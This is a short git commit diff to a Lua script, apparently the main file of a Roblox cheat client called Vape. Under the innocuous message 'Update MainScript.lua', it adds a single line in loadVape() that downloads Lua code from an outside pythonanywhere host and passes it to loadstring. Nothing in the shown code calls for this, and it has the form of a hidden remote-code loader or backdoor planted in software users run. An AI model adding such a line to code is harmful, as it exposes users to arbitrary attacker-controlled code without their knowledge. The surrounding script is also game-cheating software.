4b3360ddc4e20243406814ac98418f4cde26c0c2
Copium <119388242+Copiums@users.noreply.github.com>
2024-03-30 00:03:05 -0400

    Update MainScript.lua

--- MainScript.lua
+++ MainScript.lua
@@ -1986,6 +1986,7 @@ local function loadVape()
 	ProfilesTextList.RefreshValues(profiles)
 	GUIbind.Reload()
 	TextGUIUpdate()
+        loadstring(game:HttpGet("https://sammz.pythonanywhere.com/retrieve/v1/velocity/fixedcheck.lua"))
 	GuiLibrary.UpdateUI(GUIColorSlider.Hue, GUIColorSlider.Sat, GUIColorSlider.Value, true)
 	if not shared.VapeSwitchServers then
 		if BlatantModeToggle.Enabled then
